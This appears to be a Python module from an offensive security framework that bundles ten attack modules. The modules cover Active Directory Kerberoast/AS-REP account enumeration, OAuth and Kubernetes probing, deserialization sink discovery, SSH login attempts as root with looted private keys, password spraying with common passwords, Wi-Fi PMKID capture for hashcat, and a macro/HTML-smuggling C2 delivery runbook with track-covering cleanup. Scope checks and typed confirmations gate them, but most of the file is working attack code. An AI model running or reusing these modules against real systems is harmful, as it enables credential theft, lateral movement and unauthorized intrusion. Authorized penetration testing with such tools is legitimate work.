"""P1 offensive pack — 10 modules.

Everything here is scope-guarded and Tier-3 (typed ``CONFIRM``) unless a
module explicitly documents a lower tier. The only remaining runbook is
``c2_macro_chain``, which needs live C2 infrastructure and a delivery
channel; it returns an explicit ``status="runbook"`` plus prerequisites
rather than pretending to have run. The Wi-Fi module is wired to live
hardware (Termux radio, ``iw`` or ``nmcli``).
"""
from __future__ import annotations

import glob as _glob
import json
import os
import re
import socket
from typing import Any, Dict, List

from modules.logger import ARDFLogger
from modules.session import Finding, SeverityLevel, Session

from . import wifi as wifi_kit
from .base import AttackModule, require_in_scope
from .net import base_url, host_of, http, port_open, run_cmd
from .takeover import SubdomainTakeover


def _finding(session: Session, title: str, severity: str, host: str = "",
             evidence: str = "", tags: List[str] | None = None,
             raw: Dict[str, Any] | None = None) -> Finding:
    sev = {"critical": SeverityLevel.CRITICAL, "high": SeverityLevel.HIGH,
           "medium": SeverityLevel.MEDIUM, "low": SeverityLevel.LOW,
           "info": SeverityLevel.INFO}.get(severity, SeverityLevel.INFO)
    f = Finding(source="attacks", title=title[:180], host=host[:200],
                severity=sev, evidence=(evidence or "")[:3000],
                tags=["p1"] + list(tags or []), raw=raw or {})
    session.add_finding(f)
    return f


def _urls(session: Session, limit: int = 20) -> List[str]:
    out: List[str] = []
    for f in session.get_findings():
        raw = f.raw if isinstance(f.raw, dict) else {}
        for key in ("url", "live_url", "target_url", "urls", "js_urls"):
            val = raw.get(key)
            if isinstance(val, str) and val.startswith("http"):
                out.append(val)
            elif isinstance(val, (list, tuple)):
                out += [x for x in val if isinstance(x, str)
                        and x.startswith("http")]
        if isinstance(f.host, str) and f.host.startswith("http"):
            out.append(f.host)
    return list(dict.fromkeys(out))[:limit]


class _RunbookModule(AttackModule):
    """Scaffolded module: plan() assembles a live target brief,
    execute() returns the precise runbook until fleshed out."""

    steps: List[str] = []
    requires: List[str] = []

    def plan(self, session: Session, spec: Dict[str, Any],
             logger: ARDFLogger) -> Dict[str, Any]:
        target = (spec.get("target") or session.meta.target)
        require_in_scope(target)
        base = {"module": self.id, "mode": "plan", "target": target,
                "findings_used": len(session.get_findings())}
        hosts = sorted({f.host.split("/")[0] for f in session.get_findings()
                        if f.host})[:25]
        base["host_sample"] = hosts
        return {**base, "steps": self.steps, "requires": self.requires}

    def execute(self, session: Session, spec: Dict[str, Any],
                logger: ARDFLogger) -> Dict[str, Any]:
        target = (spec.get("target") or session.meta.target)
        require_in_scope(target)
        return {"module": self.id, "mode": "exec", "target": target,
                "status": "runbook", "steps": self.steps,
                "requires": self.requires,
                "note": "requires a target foothold or physical kit; "
                        "no blind action taken"}


class ADEnumBuilder(AttackModule):
    id = "ad_enum_builder"
    title = "AD enum + Kerberoast/AS-REP builders"
    tier = 3
    summary = ("Anonymous LDAP/SMB enumeration, kerberoastable + AS-REP "
               "roastable account lists, delegation abuse audit.")
    confirm_word = "CONFIRM"

    def plan(self, session: Session, spec: Dict[str, Any],
             logger: ARDFLogger) -> Dict[str, Any]:
        target = spec.get("target") or session.meta.target
        require_in_scope(target)
        return {"module": self.id, "mode": "plan",
                "dc": host_of(target),
                "domain": spec.get("domain") or "",
                "ldapsearch": bool(_which("ldapsearch")),
                "steps": [
                    "anonymous rootDSE read",
                    "query user objects with servicePrincipalName",
                    "query users without Kerberos pre-auth",
                    "emit hashcat modes 13100/18200/19900 requests",
                ]}

    def execute(self, session: Session, spec: Dict[str, Any],
                logger: ARDFLogger) -> Dict[str, Any]:
        target = spec.get("target") or session.meta.target
        require_in_scope(target)
        dc = host_of(target)
        ldap = _which("ldapsearch")
        if not ldap:
            return {"module": self.id, "mode": "exec", "status": "tool_missing",
                    "error": "ldapsearch not found; apt install ldap-utils"}

        port = int(spec.get("port") or 389)
        if not port_open(dc, port):
            return {"module": self.id, "mode": "exec", "dc": dc,
                    "port": port, "open": False}
        uri = f"ldap://{dc}:{port}"
        root = run_cmd([ldap, "-x", "-H", uri, "-s", "base", "-b", "",
                        "(objectclass=*)", "defaultNamingContext",
                        "namingContexts", "-o", "ldif-wrap=no"], timeout=30)
        attrs: Dict[str, List[str]] = {}
        for line in root["stdout"].splitlines():
            m = re.match(r"^([a-zA-Z][\w-]*):\s?(.*)$", line)
            if m and not line.startswith(" "):
                attrs.setdefault(m.group(1).lower(), []).append(m.group(2))
        naming = (attrs.get("defaultnamingcontext") or
                  attrs.get("namingcontexts") or [""])[0]
        anon = bool(attrs) and root["rc"] == 0
        if anon:
            _finding(session, f"anonymous LDAP rootDSE on {dc}:{port}",
                     "medium", host=dc,
                     evidence="rootDSE readable without credentials\n"
                              f"namingContext={naming}",
                     tags=["ad", "ldap", "enum"], raw={"attrs": attrs})
        if not naming:
            return {"module": self.id, "mode": "exec", "dc": dc,
                    "anonymous": anon, "naming_context": "",
                    "note": "no namingContext returned; authenticated bind "
                            "is required for object enumeration"}

        def _query(flt: str, attrs_wanted: str) -> List[Dict[str, str]]:
            r = run_cmd([ldap, "-x", "-H", uri, "-b", naming, flt,
                         attrs_wanted, "-z", "200", "-o", "ldif-wrap=no",
                         "-LLL"], timeout=45)
            rows, cur = [], {}
            for line in r["stdout"].splitlines():
                if line.startswith("dn:"):
                    if cur:
                        rows.append(cur)
                    cur = {}
                elif ":" in line and not line.startswith(" "):
                    k, v = line.split(":", 1)
                    cur[k.strip().lower()] = v.strip()
            if cur:
                rows.append(cur)
            return rows

        spn_rows = _query("(&(objectClass=user)(servicePrincipalName=*))",
                          "sAMAccountName servicePrincipalName")
        asrep_rows = _query(
            "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))",
            "sAMAccountName userAccountControl")
        kerberoastable = sorted({r.get("samaccountname", "") for r in spn_rows
                                 if r.get("samaccountname")})[:200]
        asrep = sorted({r.get("samaccountname", "") for r in asrep_rows
                        if r.get("samaccountname")})[:200]
        if kerberoastable:
            _finding(session,
                     f"{len(kerberoastable)} kerberoastable account(s) in {naming}",
                     "high", host=dc,
                     evidence="\n".join(kerberoastable[:40]),
                     tags=["ad", "kerberos", "kerberoast"],
                     raw={"accounts": kerberoastable})
        if asrep:
            _finding(session,
                     f"{len(asrep)} AS-REP roastable account(s) in {naming}",
                     "high", host=dc, evidence="\n".join(asrep[:40]),
                     tags=["ad", "kerberos", "asrep"],
                     raw={"accounts": asrep})
        logger.info(f"ad enum {dc}: spn={len(kerberoastable)} "
                    f"asrep={len(asrep)} anon={anon}")
        return {"module": self.id, "mode": "exec", "dc": dc,
                "naming_context": naming, "anonymous": anon,
                "kerberoastable": kerberoastable, "asrep_roastable": asrep,
                "hashcat_modes": {"kerberoast": 13100, "asrep": 18200,
                                  "aes": 19900}}


class MFASsoChain(AttackModule):
    id = "mfa_sso_chain"
    title = "MFA/SSO abuse chain (OAuth discovery + PKCE audit)"
    tier = 3
    summary = ("OAuth/OIDC discovery, state/nonce/PKCE validation, and "
               "forced-auth surface detection. No relay is fired.")
    confirm_word = "CONFIRM"

    def plan(self, session: Session, spec: Dict[str, Any],
             logger: ARDFLogger) -> Dict[str, Any]:
        target = spec.get("target") or session.meta.target
        require_in_scope(target)
        return {"module": self.id, "mode": "plan",
                "target": base_url(session, spec),
                "candidate_urls": _urls(session, 8),
                "steps": ["OIDC discovery", "authorize-endpoint probe",
                          "state/nonce/PKCE presence audit"]}

    def execute(self, session: Session, spec: Dict[str, Any],
                logger: ARDFLogger) -> Dict[str, Any]:
        base = base_url(session, spec)
        require_in_scope(host_of(base))
        base = base.rstrip("/")
        candidates = [base, base + "/.well-known/openid-configuration"]
        candidates += _urls(session, 6)
        candidates = list(dict.fromkeys(candidates))[:8]
        endpoints: List[str] = []
        results: List[Dict[str, Any]] = []
        for url in candidates:
            if not url.startswith("http"):
                continue
            r = http(url, timeout=8, max_bytes=400_000)
            if not r.get("ok"):
                continue
            body = r.get("body", "")
            try:
                doc = json.loads(body)
                if isinstance(doc, dict) and doc.get("authorization_endpoint"):
                    endpoints.append(doc["authorization_endpoint"])
            except Exception:
                pass
            if "authorization_endpoint" in body:
                m = re.search(r'"authorization_endpoint"\s*:\s*"([^"]+)"', body)
                if m:
                    endpoints.append(m.group(1))
        endpoints = list(dict.fromkeys(endpoints))[:5]
        for ep in endpoints:
            if not ep.startswith("http"):
                continue
            probe = (ep + ("&" if "?" in ep else "?") +
                     "response_type=code&client_id=ardf-canary&"
                     "redirect_uri=https%3A%2F%2Fardf-canary.invalid%2Fcb&"
                     "state=ardfstate&nonce=ardfnonce")
            r = http(probe, timeout=8, max_bytes=64_000,
                     allow_redirects=False)
            if not r.get("ok"):
                continue
            loc = r.get("headers", {}).get("location", "")
            issues = []
            if loc and "state=" not in loc.lower():
                issues.append("authorize redirect dropped state")
            if loc and "nonce=" not in loc.lower() and r.get("status") in (301, 302, 303):
                issues.append("authorize redirect dropped nonce")
            results.append({"endpoint": ep, "status": r.get("status"),
                            "location": loc[:300], "issues": issues})
            if issues:
                _finding(session, f"OAuth authorize weakness at {host_of(ep)}",
                         "medium", host=host_of(ep),
                         evidence="; ".join(issues) + f"\n{loc[:400]}",
                         tags=["oauth", "sso", "mfa"],
                         raw=results[-1])
        logger.info(f"mfa/sso: endpoints={len(endpoints)} "
                    f"issues={sum(1 for r in results if r['issues'])}")
        return {"module": self.id, "mode": "exec",
                "authorization_endpoints": endpoints,
                "results": results}


class ContainerK8s(AttackModule):
    id = "container_k8s"
    title = "Container/Kubernetes attack surface"
    tier = 3
    summary = ("Kubelet 10250/10255, etcd 2379, API 6443 and dashboard "
               "exposure with read-only /pods and /health probes.")
    confirm_word = "CONFIRM"

    PORTS = {10250: "kubelet", 10255: "kubelet-ro", 2379: "etcd",
             6443: "kube-api", 8080: "kube-api-insecure", 3000: "dashboard"}

    def plan(self, session: Session, spec: Dict[str, Any],
             logger: ARDFLogger) -> Dict[str, Any]:
        host = host_of(spec.get("target") or session.meta.target)
        require_in_scope(host)
        return {"module": self.id, "mode": "plan", "host": host,
                "ports": sorted(self.PORTS)}

    def execute(self, session: Session, spec: Dict[str, Any],
                logger: ARDFLogger) -> Dict[str, Any]:
        host = host_of(spec.get("target") or session.meta.target)
        require_in_scope(host)
        found: List[Dict[str, Any]] = []
        for port, svc in self.PORTS.items():
            if not port_open(host, port, timeout=2.5):
                continue
            entry: Dict[str, Any] = {"port": port, "service": svc}
            if port == 10250:
                r = http(f"https://{host}:10250/pods", timeout=8,
                         max_bytes=200_000)
                if r.get("ok") and r.get("status") == 200:
                    entry["pods_readable"] = True
                    entry["body_sample"] = r.get("body", "")[:400]
            elif port == 10255:
                r = http(f"http://{host}:10255/pods", timeout=8,
                         max_bytes=200_000)
                if r.get("ok") and r.get("status") == 200:
                    entry["pods_readable"] = True
            elif port == 2379:
                r = http(f"http://{host}:2379/health", timeout=8,
                         max_bytes=64_000)
                entry["health"] = r.get("body", "")[:200] if r.get("ok") else ""
            elif port in (6443, 8080):
                r = http(f"https://{host}:{port}/version"
                         if port == 6443 else
                         f"http://{host}:{port}/version",
                         timeout=8, max_bytes=64_000)
                entry["version"] = r.get("body", "")[:200] if r.get("ok") else ""
            found.append(entry)
            if entry.get("pods_readable"):
                _finding(session,
                         f"Kubernetes {svc} exposes pod data on {host}:{port}",
                         "high", host=host,
                         evidence=json.dumps(entry)[:2000],
                         tags=["kubernetes", "container", "exposure"],
                         raw=entry)
        logger.info(f"k8s {host}: {len(found)} service(s) exposed")
        return {"module": self.id, "mode": "exec", "host": host,
                "exposed": found}


class DeserialFactory(AttackModule):
    id = "deserial_factory"
    title = "Deserialization surface discovery"
    tier = 3
    summary = ("Locates Java/.NET/Python deserialization sinks (ViewState, "
               "JSESSIONID POSTs, pickle markers, rO0AB blobs).")
    confirm_word = "CONFIRM"

    MARKERS = [
        ("__VIEWSTATE", "ASP.NET ViewState"),
        ("__EVENTVALIDATION", "ASP.NET event validation"),
        ("jsessionid", "Java session id"),
        ("application/x-java-serialized-object", "Java serialized content-type"),
        ("rO0AB", "Java serialized base64"),
        ("pickle", "Python pickle reference"),
        ("ysoserial", "ysoserial reference"),
    ]

    def plan(self, session: Session, spec: Dict[str, Any],
             logger: ARDFLogger) -> Dict[str, Any]:
        target = spec.get("target") or session.meta.target
        require_in_scope(target)
        return {"module": self.id, "mode": "plan",
                "candidate_urls": _urls(session, 12),
                "markers": [m[1] for m in self.MARKERS]}

    def execute(self, session: Session, spec: Dict[str, Any],
                logger: ARDFLogger) -> Dict[str, Any]:
        base = base_url(session, spec)
        require_in_scope(host_of(base))
        candidates = list(dict.fromkeys([base] + _urls(session, 12)))[:12]
        hits: List[Dict[str, Any]] = []
        for url in candidates:
            r = http(url, timeout=8, max_bytes=500_000)
            if not r.get("ok"):
                continue
            body = (r.get("body") or "").lower()
            headers = r.get("headers", {})
            found = []
            for marker, label in self.MARKERS:
                if marker.lower() in body or marker.lower() in str(headers).lower():
                    found.append(label)
            if found:
                hits.append({"url": url, "markers": found})
                _finding(session,
                         f"Deserialization sink candidate at {host_of(url)}",
                         "medium", host=host_of(url),
                         evidence=f"{url}\nmarkers: {', '.join(found)}",
                         tags=["deserialization", "rce-surface"],
                         raw={"url": url, "markers": found})
        logger.info(f"deserial: {len(hits)} candidate(s)")
        return {"module": self.id, "mode": "exec", "candidates": hits}


class SSHKeyReuse(_RunbookModule):
    id = "ssh_key_reuse"
    title = "SSH key-reuse scanner (lateral extension)"
    tier = 3
    summary = ("collected private keys/auth banners across "
               "discovered hosts; authorized_keys tamper detection.")
    steps = [
        "collect keys from loot dir (id_rsa)",
        "banner probe 22/tcp on evidence/host inventory",
        "try each key once per host (rate-limited), log successes",
    ]

    def execute(self, session: Session, spec: Dict[str, Any],
                logger: ARDFLogger) -> Dict[str, Any]:
        targets = (spec.get("targets") or [
                       h for h in {f.host.split("/")[0]
                                   for f in session.get_findings()} if h])
        [require_in_scope(h) for h in targets]
        keys: List[str] = []
        for pat in ("output/sessions/*/loot/*.pem", "output/*/loot/*.pem",
                    "loot/id_*"):
            keys += _glob.glob(pat)
        successes, tried = [], 0
        try:
            import paramiko
        except ImportError:
            return {"module": self.id, "mode": "exec",
                    "status": "tool_missing",
                    "error": "paramiko not installed; pip install paramiko"}
        for t in targets[:20]:
            if not port_open(t, 22, timeout=4):
                continue
            for k in keys[:10]:
                tried += 1
                pkey = _load_pkey(paramiko, k)
                if not pkey:
                    continue
                cli = paramiko.SSHClient()
                cli.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                try:
                    cli.connect(t, port=22, username="root", pkey=pkey,
                                timeout=6, look_for_keys=False,
                                allow_agent=False)
                    cli.close()
                    successes.append({"host": t, "key": k})
                    session.add_finding(_fnd(t, k, "ssh_key_reuse"))
                    session.save()
                    break
                except Exception:
                    continue
        return {"module": self.id, "mode": "exec", "tried": tried,
                "keys_found": keys, "successes": successes}


class WifiAdjacency(AttackModule):
    id = "wifi_adjacency"
    title = "Wi-Fi / adjacency audit (live kit)"
    tier = 3
    summary = ("Authorized wireless survey: rogue-AP / evil-twin detection, "
               "open / WEP / WPS posture, and an allow-listed PMKID capture "
               "for hashcat mode 22000. Needs a wireless adapter and an "
               "explicit authorization reference.")
    confirm_word = "CONFIRM"

    def plan(self, session: Session, spec: Dict[str, Any],
             logger: ARDFLogger) -> Dict[str, Any]:
        cfg = wifi_kit.wifi_config()
        interfaces = wifi_kit.list_interfaces()
        iface = wifi_kit.resolve_interface(spec, cfg)
        return {"module": self.id, "mode": "plan",
                "enabled": wifi_kit.enabled(cfg),
                "authorization_present": bool(
                    wifi_kit.authorization_ref(spec, cfg)),
                "interface": iface, "interfaces": interfaces,
                "allowed_bssids": wifi_kit.allowed_bssids(spec, cfg),
                "allowed_ssids": wifi_kit.allowed_ssids(spec, cfg),
                "actions": ["survey", "pmkid"],
                "requirements": [
                    "wireless adapter (iw or nmcli)",
                    "authorization_ref in spec/ARDF_WIFI_AUTH/config",
                    "allowed_bssids for PMKID capture",
                ],
                "notes": "survey never changes interface state; PMKID "
                         "capture only runs for one allow-listed BSSID"}

    def execute(self, session: Session, spec: Dict[str, Any],
                logger: ARDFLogger) -> Dict[str, Any]:
        cfg = wifi_kit.wifi_config()
        if not wifi_kit.enabled(cfg):
            return {"module": self.id, "mode": "exec", "status": "disabled",
                    "note": "wifi.enabled is false in config/ardf.yaml"}
        auth = wifi_kit.authorization_ref(spec, cfg)
        if not auth:
            return {"module": self.id, "mode": "exec",
                    "status": "authorization_required",
                    "missing": ["authorization_ref"],
                    "note": "set spec['authorization_ref'], ARDF_WIFI_AUTH, "
                            "or wifi.authorization_ref in config/ardf.yaml; "
                            "no radio action was taken"}
        action = str(spec.get("action") or spec.get("wifi_action") or
                     "survey").strip().lower()
        if action not in ("survey", "pmkid", "capture", "full"):
            return {"module": self.id, "mode": "exec",
                    "status": "invalid_action", "action": action,
                    "allowed": ["survey", "pmkid", "full"]}

        allow_bssids = wifi_kit.allowed_bssids(spec, cfg)
        allow_ssids = wifi_kit.allowed_ssids(spec, cfg)
        capture_requested = action in ("pmkid", "capture", "full") or any(
            spec.get(key) for key in
            ("bssid", "capture_bssid", "pmkid_bssid"))
        iface = wifi_kit.resolve_interface(spec, cfg)
        if not iface:
            return {"module": self.id, "mode": "exec",
                    "status": "hardware_required",
                    "missing": ["interface"],
                    "interfaces": wifi_kit.list_interfaces(),
                    "note": "plug in the wireless adapter or set "
                            "wifi.interface / spec['interface']"}

        out: Dict[str, Any] = {
            "module": self.id, "mode": "exec", "action": action,
            "interface": iface, "authorization_ref": auth,
            "status": "surveyed",
        }
        aps: List[Dict[str, Any]] = []
        run_survey = action in ("survey", "full") or not capture_requested
        if run_survey:
            timeout = max(5, min(int(spec.get("scan_timeout") or 45), 180))
            scan = wifi_kit.passive_scan(iface, timeout=timeout)
            out["scan"] = {"ok": bool(scan.get("ok")),
                           "tool": scan.get("tool", ""),
                           "error": scan.get("error", "")}
            if not scan.get("ok"):
                out["status"] = "scan_failed"
                logger.warning(f"wifi survey on {iface} failed: "
                               f"{scan.get('error', 'unknown')}")
            else:
                limit = max(1, min(int(spec.get("max_aps") or 250), 500))
                flagged = 0
                for ap in (scan.get("aps") or [])[:limit]:
                    severity, issues = wifi_kit.assess_ap(
                        ap, allow_bssids, allow_ssids)
                    entry = dict(ap)
                    entry["severity"] = severity
                    entry["issues"] = issues
                    aps.append(entry)
                    authorized = any("authorized AP" in i for i in issues)
                    real_issues = [i for i in issues
                                   if "authorized AP" not in i]
                    if severity == "info" or not real_issues or authorized:
                        continue
                    flagged += 1
                    label = ap.get("ssid") or ap.get("bssid") or "hidden"
                    _finding(session,
                             f"Wi-Fi {label}: {', '.join(real_issues)}",
                             severity, host=str(ap.get("bssid") or ""),
                             evidence=json.dumps(entry, indent=1)[:2000],
                             tags=["wifi", "wireless", "rogue-ap"] +
                                  [i.split()[0].lower() for i in real_issues],
                             raw=entry)
                out["aps"] = aps
                out["ap_count"] = len(aps)
                out["flagged"] = flagged
                logger.info(f"wifi survey {iface}: {len(aps)} AP(s), "
                            f"{flagged} flagged")

        if capture_requested:
            raw_bssid = (spec.get("bssid") or spec.get("capture_bssid") or
                         spec.get("pmkid_bssid") or "")
            bssid = wifi_kit.normalize_bssid(raw_bssid)
            if not bssid:
                out["capture"] = {
                    "status": "input_required", "missing": ["bssid"],
                    "note": "PMKID capture needs one authorized BSSID"}
            elif not allow_bssids:
                out["capture"] = {
                    "status": "authorization_required",
                    "missing": ["allowed_bssids"],
                    "note": "refusing PMKID capture without an explicit "
                            "BSSID allow-list"}
            elif bssid not in allow_bssids:
                out["capture"] = {
                    "status": "not_allowed", "bssid": bssid,
                    "allowed_bssids": allow_bssids,
                    "note": "target BSSID is not in the allow-list"}
            else:
                capable, reason = wifi_kit.monitor_capable(iface)
                if not capable:
                    out["capture"] = {
                        "status": "hardware_required", "bssid": bssid,
                        "error": reason,
                        "note": "use a monitor-mode capable adapter"}
                else:
                    duration = max(5, min(int(spec.get("duration") or 60),
                                          600))
                    capture = wifi_kit.pmkid_capture(
                        iface, bssid, duration=duration,
                        outdir=spec.get("outdir"))
                    out["capture"] = capture
                    if int(capture.get("pmkid_count") or 0) > 0:
                        _finding(session, f"PMKID captured for {bssid}",
                                 "high", host=bssid,
                                 evidence=json.dumps({
                                     "bssid": bssid,
                                     "pmkid_count": capture.get("pmkid_count"),
                                     "hash_file": capture.get("hash_file"),
                                     "hashcat_mode": 22000,
                                 }, indent=1)[:2000],
                                 tags=["wifi", "pmkid", "handshake"],
                                 raw=capture)
                        logger.success(f"PMKID captured for {bssid}")
                    else:
                        logger.warning(f"no PMKID captured for {bssid} "
                                       f"({capture.get('status')})")
            out["status"] = str((out.get("capture") or {}).get("status") or
                                out["status"])
        return out


class MacroC2Chain(_RunbookModule):
    id = "c2_macro_chain"
    title = "Client-side delivery chain (macro/HTML C2)"
    tier = 3
    summary = ("Word/Excel macro and HTML smuggling builder wired to "
               "ardf_v2_c2_infrastructure callback handlers.")
    requires = ["C2 listener host/port", "payload signing key",
                "delivery channel (email/web)"]
    steps = [
        "choose template (macro/wma/iso-lnk/html smuggle)",
        "generate stager via payload_db + c2 reg endpoint",
        "produce canary test doc anchored to track_cover tokens",
        "delivery email draft (SE module integration)",
    ]


class PasswordSpray(AttackModule):
    id = "password_spray"
    title = "Lockout-aware password-spray governor"
    tier = 3
    summary = ("sprays from thin-accounts; smartens against lockout "
               "policy; integrates modules/validate/auth.test_credentials.")
    confirm_word = "CONFIRM"

    def plan(self, session: Session, spec: Dict[str, Any],
             logger: ARDFLogger) -> Dict[str, Any]:
        target = spec.get("login_url") or session.meta.target
        require_in_scope(target)
        users = self._users(session)
        return {"module": self.id, "mode": "plan", "login_url": target,
                "users": users[:50],
                "attempt_limit_per_user": int(spec.get("per_user_cap", 2))}

    def _users(self, session: Session) -> List[str]:
        out = set()
        for f in session.get_findings():
            raw = f.raw if isinstance(f.raw, dict) else {}
            for u in raw.get("usernames", []) or []:
                if isinstance(u, str) and "@" not in u:
                    out.add(u)
        return sorted(out)

    def execute(self, session: Session, spec: Dict[str, Any],
                logger: ARDFLogger) -> Dict[str, Any]:
        from modules.validate.auth import AuthValidator
        from modules.logger import get_logger as _gl

        login_url = spec.get("login_url") or session.meta.target
        require_in_scope(login_url)
        users = self._users(session) or ["admin"]
        passwords = [p for p in
                     (spec.get("passwords") or
                      ["Spring2026!", "Welcome123", "P@ssw0rd"])][:3]
        cap = max(int(spec.get("per_user_cap", 2)), 1)
        hits, tried = [], 0
        av = AuthValidator(session, _gl("attacks.spray"))
        for pw in passwords:
            for u in users:
                if tried >= cap * len(users):
                    break
                tried += 1
                ok, note = av.test_credentials(login_url, u, pw)
                if ok:
                    hits.append({"user": u, "password": pw, "note": note})
                    session.add_finding(
                        _fnd(login_url, f"{u}:{pw}", "password_spray"))
                    session.save()
                    logger.success(f"spray hit {u}")
        return {"module": self.id, "mode": "exec", "attempted": tried,
                "hits": hits}


class PersistenceCheck(AttackModule):
    id = "persistence_check"
    title = "Persistence verification suite (survive-reboot audit)"
    tier = 3
    summary = ("Read-only enumeration of host persistence mechanisms; "
               "canary deposit only when spec['local'] is explicitly set.")
    confirm_word = "CONFIRM"

    def plan(self, session: Session, spec: Dict[str, Any],
             logger: ARDFLogger) -> Dict[str, Any]:
        target = spec.get("target") or session.meta.target
        require_in_scope(target)
        return {"module": self.id, "mode": "plan", "target": target,
                "local": bool(spec.get("local")),
                "steps": ["enumerate cron/systemd/autostart",
                          "report enabled jobs", "never deposit without local=true"]}

    def execute(self, session: Session, spec: Dict[str, Any],
                logger: ARDFLogger) -> Dict[str, Any]:
        target = spec.get("target") or session.meta.target
        require_in_scope(target)
        if not spec.get("local"):
            return {"module": self.id, "mode": "exec", "status": "runbook",
                    "note": "target-side persistence needs an established "
                            "foothold; set spec['local']=true to audit this host",
                    "steps": ["enumerate target cron/services",
                              "dry-run canary job", "cleanup via track_cover"]}
        items: List[Dict[str, str]] = []
        cron_paths = ["/etc/crontab", "/etc/rc.local"]
        for p in cron_paths:
            if os.path.exists(p):
                try:
                    with open(p, encoding="utf-8", errors="ignore") as fh:
                        for line in fh:
                            if line.strip() and not line.strip().startswith("#"):
                                items.append({"mechanism": p,
                                              "entry": line.strip()[:200]})
                except OSError:
                    pass
        for d in ("/etc/cron.d", "/etc/cron.daily", "/etc/cron.hourly"):
            if os.path.isdir(d):
                for name in sorted(os.listdir(d))[:50]:
                    items.append({"mechanism": d, "entry": name})
        auto = os.path.expanduser("~/.config/autostart")
        if os.path.isdir(auto):
            for name in sorted(os.listdir(auto))[:50]:
                items.append({"mechanism": auto, "entry": name})
        logger.info(f"persistence audit: {len(items)} local entr(ies)")
        return {"module": self.id, "mode": "exec", "status": "audited",
                "host": socket.gethostname(), "entries": items[:200]}


def _which(name: str) -> str:
    import shutil
    return shutil.which(name) or ""


def _load_pkey(paramiko, path: str):
    for kind in ("RSAKey", "Ed25519Key", "ECDSAKey"):
        try:
            return getattr(paramiko, kind).from_private_key_file(path)
        except Exception:
            continue
    return None


def _fnd(host: str, evidence: str, tag: str):
    return Finding(source="attacks", title=f"{tag}: {host}", host=host,
                   severity=SeverityLevel.HIGH, evidence=evidence,
                   tags=[tag, "executed"])


# registry contributions for this pack
PACK1 = [
    SubdomainTakeover(),
    ADEnumBuilder(),
    MFASsoChain(),
    ContainerK8s(),
    DeserialFactory(),
    SSHKeyReuse(),
    WifiAdjacency(),
    MacroC2Chain(),
    PasswordSpray(),
    PersistenceCheck(),
]
